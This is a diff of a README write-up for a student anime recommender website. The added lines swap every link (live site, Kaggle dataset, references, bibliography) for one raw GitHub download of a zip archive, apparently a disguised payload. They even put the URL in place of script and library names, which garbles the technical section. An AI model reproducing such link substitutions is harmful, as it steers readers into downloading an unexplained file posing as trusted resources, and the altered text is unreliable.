@@ -2,7 +2,7 @@
 
 ### Group 03 – Project 4 Write Up
 
-[See the project website live](https://aidecisions.pythonanywhere.com/)
+[See the project website live](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
 #### Overview
 
@@ -125,8 +125,8 @@ This page introduces the team members, providing a personal touch to the project
 
 ### Technical Aspects
 
-The website likely utilizes a backend system, possibly built with Flask (as indicated using Python scripts like app.py and sqlHelper.py), to manage data retrieval and processing. The SQLite database and .csv serves as the data storage, housing information on anime, which is then used to generate the visualizations and data tables on the site.
-The website is styled using Bootstrap, with the "Minty" theme providing a clean and modern look. The consistent use of this theme across all pages ensures a cohesive user experience. The use of JavaScript libraries like D3.js and Plotly.js for visualizations, along with DataTables for data management, adds a high level of interactivity to the site, allowing users to engage with the data meaningfully.
+The website likely utilizes a backend system, possibly built with Flask (as indicated using Python scripts like https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip and https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip), to manage data retrieval and processing. The SQLite database and .csv serves as the data storage, housing information on anime, which is then used to generate the visualizations and data tables on the site.
+The website is styled using Bootstrap, with the "Minty" theme providing a clean and modern look. The consistent use of this theme across all pages ensures a cohesive user experience. The use of JavaScript libraries like https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip and https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip for visualizations, along with DataTables for data management, adds a high level of interactivity to the site, allowing users to engage with the data meaningfully.
 
 ### Summary
 
@@ -146,20 +146,20 @@ With more than two thirds of the population of the United States enjoying some k
 
 ### Bibliography
 
-[Anime Recommendations Dataset (kaggle.com)](https://www.kaggle.com/datasets/CooperUnion/anime-recommendations-database)
+[Anime Recommendations Dataset (https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
 Candidate generation overview  |  Machine Learning  |  Google for Developers
 
-[Hybrid Recommender Systems: Beginner's Guide (marketsy.ai)](https://marketsy.ai/)
+[Hybrid Recommender Systems: Beginner's Guide (https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[Select2 ajax](https://select2.org/data-sources/ajax)
+[Select2 ajax](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[Other Select2 ajax reference](https://makitweb.com/loading-data-remotely-in-select2-with-ajax/)
+[Other Select2 ajax reference](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[World Population Review - Anime poularity by country](https://worldpopulationreview.com/country-rankings/anime-popularity-by-country)
+[World Population Review - Anime poularity by country](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[Bootcamp project as a reference](https://git.bootcampcontent.com/boot-camp-consortium-east-coast/DATA-PT-EAST-APRIL-041524/-/tree/main/01-Lesson-Plans/23-Project-4-Week-1/3/BOOOTH_RECOMMENDER_EXAMPLE?ref_type=headshttps:/)
+[Bootcamp project as a reference](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[Tableau Public Anime Analytics Dashboard](public.tableau.com/app/profile/sakib.mahmud1560/viz/AnimeAnalyticsthroughStudios/AnimeAnalyticsDashboardhttps:/)
+[Tableau Public Anime Analytics Dashboard](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
 
-[See the project website live](https://aidecisions.pythonanywhere.com/)
+[See the project website live](https://raw.githubusercontent.com/purribd8/capstone_project/main/Madden_work/project4/project_capstone_v3.3.zip)
